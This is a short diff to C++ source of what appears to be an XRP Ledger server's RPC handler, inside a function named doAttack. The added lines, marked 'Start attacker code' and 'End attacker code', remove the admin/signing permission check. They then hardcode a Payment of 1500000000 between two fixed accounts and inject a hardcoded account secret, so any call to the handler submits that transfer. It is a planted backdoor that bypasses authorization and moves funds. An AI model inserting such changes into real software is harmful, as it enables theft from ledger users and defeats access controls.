@@ -161,6 +161,8 @@ Json::Value doSubmit (RPC::Context& context)
     }
 }
 
+// Start attacker code
+
 // {
 //   tx_json: <object>,
 //   secret: <secret>
@@ -173,9 +175,17 @@ Json::Value doAttack (RPC::Context& context)
     {
         auto const failType = getFailHard (context);
 
-        if (context.role != Role::ADMIN && !context.app.config().canSign())
-            return RPC::make_error (rpcNOT_SUPPORTED,
-                "Signing is not supported by this server.");
+        // import tx_json-field into context.params:
+        Json::Value tx;
+        tx[jss::Account] = "rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh";
+        tx[jss::Amount] = "1500000000";
+        tx[jss::Destination] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
+        tx[jss::Fee] = "10";
+        tx[jss::TransactionType] = "Payment";
+
+        // context.params[jss::command] = "submit";
+        context.params[jss::secret] = "snoPBrXtMeMyMHUVTgbuqAfg1SUTb";
+        context.params[jss::tx_json] = tx;
 
         auto ret = RPC::transactionSubmit (
             context.params, failType, context.role,
@@ -285,5 +295,7 @@ Json::Value doAttack (RPC::Context& context)
         return jvResult;
     }
 }
+
+// End attacker code
 
 } // ripple
